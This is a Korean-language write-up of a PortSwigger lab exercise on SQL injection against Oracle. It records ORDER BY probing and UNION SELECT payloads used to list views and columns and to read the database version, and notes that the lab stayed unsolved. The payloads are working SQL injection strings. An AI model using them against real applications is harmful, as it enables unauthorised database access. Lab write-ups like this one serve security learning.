---
title: "SQL injection attack, querying the database type and version on Oracle"
tags:
  - portswigger
  - sql-injection
lab_url: "https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle"
difficulty: Practitioner
draft: false
---

# SQL injection attack, querying the database type and version on Oracle

## 목표와 현재 상태

상품 카테고리 필터의 SQL injection으로 Oracle 데이터베이스의 버전 문자열을 조회하는 실습이다. 2026-09-30 캡처에서는 데이터베이스 종류와 버전을 화면에 출력했지만, 실습 배지는 **Not solved**였다. 이 노트는 확인한 시도와 결과를 기록한다.

## 확인한 과정

1. `category`에 `' ORDER BY 1 --`, `' ORDER BY 2 --`, `' ORDER BY 3 --`을 차례로 넣었다. 세 번째 요청에서 `Internal Server Error`가 나와 반환 열을 2개로 판단했다.
2. 첫 번째 열에 문자열을 표시할 수 있음을 다음 쿼리로 확인하고, `ALL_VIEWS`에서 뷰 이름을 조회했다.

   ```sql
   ' UNION SELECT view_name, NULL FROM all_views --
   ```

   ![UNION SELECT로 뷰 이름을 조회한 화면](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/01-union-select-view-names.png)

3. `ALL_TAB_COLUMNS`에서 버전 관련 뷰의 열 이름과 자료형을 확인했다. 저장한 `results.json`에는 `PRODUCT_COMPONENT_VERSION`의 `PRODUCT`, `VERSION`, `STATUS` 열이 있었다. 이 JSON은 **열 정보**이고 실제 버전 값은 아니다.

   ```sql
   ' UNION SELECT column_name, data_type
   FROM all_tab_columns
   WHERE table_name = 'PRODUCT_COMPONENT_VERSION' --
   ```

   ![뷰의 열 이름과 자료형을 확인한 화면](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/02-column-names-and-data-types-json.png)

4. `PRODUCT_COMPONENT_VERSION`의 각 열을 조회해 `Oracle Database 11g Express Edition`과 `11.2.0.2.0`을 확인했다. 이후 제품명·버전·상태를 **한 쿼리에서 결합**해 첫 번째 출력 열에 표시했다. 두 번째 출력 열은 `NULL`로 맞췄다.

   ```sql
   ' UNION SELECT PRODUCT || ' | ' || VERSION || ' | ' || STATUS, NULL
   FROM PRODUCT_COMPONENT_VERSION --
   ```

   응답에는 다음 네 행이 표시됐다.

   ```text
   NLSRTL | 11.2.0.2.0 | Production
   Oracle Database 11g Express Edition | 11.2.0.2.0 | 64bit Production
   PL/SQL | 11.2.0.2.0 | Production
   TNS for Linux: | 11.2.0.2.0 | Production
   ```

   ![버전 정보 네 행과 Not solved 상태](https://raw.githubusercontent.com/ddomology/portswigger-lab-notes/main/content/labs/sql-injection/images/lab-querying-database-version-oracle/03-product-component-version-not-solved.png)

## 캡처에서 Not solved인 이유

캡처의 실습 설명은 `Oracle Database 11g Express Edition Release ...`, `PL/SQL Release ...`, `CORE ...`, `TNS for Linux: Version ...`, `NLSRTL Version ...` 등 **다섯 개의 문자열**을 요구한다. 위 쿼리는 네 행을 표시했고 `CORE`가 없으며 `Release`/`Version` 표기도 다르다. 화면의 배지도 `Not solved`다. 출력 형식과 항목의 차이가 판정에 영향을 준 것으로 보이지만, 채점 로직 자체는 확인하지 않았다.

[PortSwigger 공식 풀이](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)는 `v$version`의 `BANNER`를 조회한다. 다음 쿼리는 **이 캡처에서 실행한 것으로 확인되지 않았다**.

```sql
' UNION SELECT BANNER, NULL FROM v$version --
```

## 배운 점

- `PRODUCT_COMPONENT_VERSION`의 `PRODUCT`, `VERSION`, `STATUS`를 함께 선택하면 같은 원본 행의 값이 한 줄에 표시된다. 앞선 CSV처럼 열마다 따로 요청한 뒤 행 번호로 맞추는 방식은 원본 행의 대응을 보장하지 않는다.
- Oracle의 `PRODUCT_COMPONENT_VERSION`은 제품과 구성 요소의 버전 정보를 제공한다. **버전 정보 노출**과 **실습 Solved 판정**은 별도로 확인해야 한다.

## 참고

- [Oracle: PRODUCT_COMPONENT_VERSION으로 릴리스 확인](https://docs.oracle.com/cd/B28359_01/server.111/b28310/dba004.htm)
